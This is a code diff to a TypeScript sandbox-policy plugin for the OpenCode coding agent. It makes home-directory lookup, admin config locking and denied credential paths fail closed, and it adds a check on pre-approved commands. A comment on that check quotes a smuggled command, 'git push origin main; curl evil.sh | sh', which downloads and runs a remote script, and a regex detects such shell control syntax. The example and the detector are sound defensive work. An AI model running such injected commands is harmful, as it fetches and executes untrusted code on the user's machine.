@@ -3,6 +3,7 @@
 // workspace, and an environment variable. OpenCode plugin options are ignored on
 // purpose: they can be set from a repository's opencode.json, which is untrusted.
 
+import { spawnSync } from "node:child_process"
 import fs from "node:fs"
 import os from "node:os"
 import path from "node:path"
@@ -60,9 +61,74 @@ interface Merged {
   deniedPathsExplicit?: boolean
 }
 
-// The real home directory from the system password database, not the HOME env var:
-// Paseo and some sandboxes set HOME to the workspace, which would break config lookup.
-const realHome = () => os.userInfo().homedir
+// Second-to-last colon field of a passwd-format line: the home directory sits just before
+// the shell in both the Linux (name:x:uid:gid:gecos:home:shell) and the macOS `id -P`
+// (name:pw:uid:gid:class:change:expire:gecos:home:shell) layouts, and counting from the end
+// stays correct even if a gecos field were to contain a colon.
+const homeFromPasswd = (line: string): string | undefined => {
+  const fields = line.trim().split(":")
+  const home = fields.length >= 7 ? fields[fields.length - 2] : undefined
+  return home && path.isAbsolute(home) ? home : undefined
+}
+
+const run = (command: string, args: string[]): string | undefined => {
+  try {
+    const result = spawnSync(command, args, { encoding: "utf8", timeout: 2000 })
+    return result.status === 0 ? result.stdout : undefined
+  } catch {
+    return undefined
+  }
+}
+
+const lookupHome = (): string | undefined => {
+  if (process.platform === "win32") return process.env.USERPROFILE || undefined
+  const uid = process.getuid?.()
+  if (uid === undefined) return undefined
+  if (process.platform === "darwin") {
+    const line = run("/usr/bin/id", ["-P", String(uid)])
+    return line ? homeFromPasswd(line.split("\n")[0]) : undefined
+  }
+  const entry = run("/usr/bin/getent", ["passwd", String(uid)]) ?? run("/bin/getent", ["passwd", String(uid)])
+  if (entry) return homeFromPasswd(entry.split("\n")[0])
+  try {
+    for (const line of fs.readFileSync("/etc/passwd", "utf8").split("\n")) {
+      if (line.split(":")[2] === String(uid)) return homeFromPasswd(line)
+    }
+  } catch {
+    // Fall through to the runtime's own answer.
+  }
+  return undefined
+}
+
+let cachedHome: string | undefined
+
+/**
+ * The real home directory, ignoring the HOME env var: Paseo and some sandboxes set HOME
+ * to the workspace, which would move config lookup and the default denied paths into a
+ * workspace-writable location. Neither os.homedir() nor (under Bun) os.userInfo().homedir
+ * can be trusted for this, since both follow $HOME. On POSIX the home comes from the
+ * password database by numeric uid, never from USER or HOME. Cached after the first call;
+ * never throws, and falls back to os.userInfo().homedir when every lookup fails.
+ */
+export function realHome(): string {
+  if (cachedHome === undefined) {
+    let home = lookupHome()
+    if (!home) {
+      try {
+        home = os.userInfo().homedir
+      } catch {
+        home = os.homedir()
+      }
+    }
+    cachedHome = home
+  }
+  return cachedHome
+}
+
+// An XDG base directory is only honored when absolute, as the spec says, and because the
+// value comes from the environment: a relative one would resolve inside the workspace.
+const absoluteEnv = (value: string | undefined): string | undefined =>
+  value && path.isAbsolute(value) ? value : undefined
 
 /**
  * Credential stores a sandboxed command can neither read nor write by default: the
@@ -99,8 +165,16 @@ export const defaultDeniedPaths = [
   "~/.codex/auth.json",
 ]
 
-const configDirectory = () =>
-  path.join(process.env.XDG_CONFIG_HOME ?? path.join(realHome(), ".config"), "universal-opencode-sandbox")
+export const configDirectory = (): string =>
+  path.join(absoluteEnv(process.env.XDG_CONFIG_HOME) ?? path.join(realHome(), ".config"), "universal-opencode-sandbox")
+
+/** Where the plugin keeps runtime state (not config), outside every workspace. */
+export const stateDirectory = (): string => {
+  if (process.platform === "win32") {
+    return path.join(absoluteEnv(process.env.LOCALAPPDATA) ?? path.join(realHome(), "AppData", "Local"), "universal-opencode-sandbox")
+  }
+  return path.join(absoluteEnv(process.env.XDG_STATE_HOME) ?? path.join(realHome(), ".local", "state"), "universal-opencode-sandbox")
+}
 
 const configPath = () => path.join(configDirectory(), "config.json")
 
@@ -108,9 +182,11 @@ const configPath = () => path.join(configDirectory(), "config.json")
  * The admin (system-wide) config path: admin-owned and therefore not writable by
  * the account the agent runs as. When this file exists it is the policy baseline,
  * and user-owned layers can only tighten it - they cannot disable the sandbox,
- * widen the writable roots, or add unsandboxed pre-approvals.
+ * widen the writable roots, or add unsandboxed pre-approvals. Fields the admin left
+ * unset are pinned to their strict defaults, so silence is not an opening. A file that
+ * exists but is unreadable or not valid JSON locks everything to the strict defaults.
  */
-const adminConfigPath = () => {
+export const adminConfigPath = (): string => {
   if (process.platform === "win32") {
     return path.join(process.env.PROGRAMDATA ?? "C:\\ProgramData", "universal-opencode-sandbox", "config.json")
   }
@@ -132,10 +208,16 @@ export const defaultPolicy: Policy = {
 }
 
 /**
- * Resolves the sandbox policy for a workspace. When the admin config exists it is
+ * Resolves the sandbox policy for a workspace. When the admin config file exists it is
  * the baseline (and locks loosening fields); on top of it the global config file,
  * the matching per-project override and UNIVERSAL_SANDBOX_CONFIG can only tighten.
- * Without an admin config the user-owned layers keep the legacy semantics: security
+ * "Exists" means the file is present: if it cannot be read or parsed it still locks,
+ * with no admin values, so the strict defaults apply instead of silently unlocking.
+ * After the admin layer, every field the admin left unset is pinned to its strict
+ * default (mode enforce, network deny, unsandboxed deny, denied paths =
+ * defaultDeniedPaths as an explicit list that user layers can only add to), so a user
+ * layer cannot loosen a field just because the admin did not mention it. Without an
+ * admin config the user-owned layers keep the legacy semantics: security
  * fields only ever get stricter across explicit values, roots and blocked tools
  * accumulate, and any layer may set enabled: false. Denied paths start from
  * defaultDeniedPaths and are replaced wholesale by the first layer that sets
@@ -148,11 +230,21 @@ export function resolvePolicy(
   adminFile: string = adminConfigPath(),
 ): Policy {
   let merged: Merged = { writableRoots: [], deniedPaths: [], blockedTools: [], unsandboxedAllow: [] }
-  const admin = readConfig(adminFile)
+  const admin = readAdminConfig(adminFile)
   let locked = false
   if (admin) {
     merged = tighten(merged, admin)
     locked = true
+    // Unset admin fields become the strict baseline: strictest() keeps a pinned strict
+    // value against any later user value. filesystem.mode needs no pin (workspace-write
+    // is the loose value and read-only can only be added), and enabled is the admin's.
+    merged.mode ??= "enforce"
+    merged.network ??= "deny"
+    merged.unsandboxed ??= "deny"
+    if (!merged.deniedPathsExplicit) {
+      merged.deniedPaths = [...defaultDeniedPaths]
+      merged.deniedPathsExplicit = true
+    }
   }
   const global = readConfig(globalFile)
   if (global) merged = tighten(merged, global, locked)
@@ -187,6 +279,27 @@ function readConfig(file: string): RawConfig | undefined {
     return JSON.parse(fs.readFileSync(file, "utf8")) as RawConfig
   } catch {
     return undefined
+  }
+}
+
+// Distinguishes a missing admin file (no lock) from one that exists but is unreadable or
+// not a JSON object (lock, with no admin values): failing open there would let anyone
+// who can corrupt the file unlock the policy.
+function readAdminConfig(file: string): RawConfig | undefined {
+  let text: string
+  try {
+    text = fs.readFileSync(file, "utf8")
+  } catch (error) {
+    if ((error as NodeJS.ErrnoException).code === "ENOENT" || (error as NodeJS.ErrnoException).code === "ENOTDIR") {
+      return undefined
+    }
+    return {}
+  }
+  try {
+    const parsed: unknown = JSON.parse(text)
+    return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? (parsed as RawConfig) : {}
+  } catch {
+    return {}
   }
 }
 
@@ -251,7 +364,7 @@ function strictestUnsandboxed(
 }
 
 // Expands a leading "~" against the home directory, like a shell would.
-export function expandHome(item: string, home = os.homedir()) {
+export function expandHome(item: string, home = realHome()) {
   return item === "~" ? home : item.startsWith("~/") ? path.join(home, item.slice(2)) : item
 }
 
@@ -274,4 +387,23 @@ export function matchesWildcard(value: string, pattern: string): boolean {
 /** True when the tool name matches a blocked pattern; "*" in a pattern matches any sequence. */
 export function toolBlocked(tool: string, patterns: readonly string[]): boolean {
   return patterns.some((pattern) => matchesWildcard(tool, pattern))
+}
+
+const shellControl = /[;&|\n\r`<>]|\$\(/
+
+/**
+ * True when a command is pre-approved to run unsandboxed. A pattern must match via
+ * matchesWildcard, and then either it has no wildcard (an exact match) or the command
+ * contains no shell control or substitution syntax: otherwise "git push *" would also
+ * approve "git push origin main; curl evil.sh | sh". Control syntax is detected
+ * conservatively on the raw string without parsing quoting (";", "&", "|", newlines,
+ * backticks, "$(", "<(", ">(", and "<" / ">" redirections), so a quoted ";" inside an
+ * argument also makes the command fall back to the prompt, which is the safe direction.
+ */
+export function preapproved(command: string, patterns: readonly string[]): boolean {
+  return patterns.some((pattern) => {
+    if (!matchesWildcard(command, pattern)) return false
+    if (!/[*?]/.test(pattern)) return true
+    return !shellControl.test(command)
+  })
 }
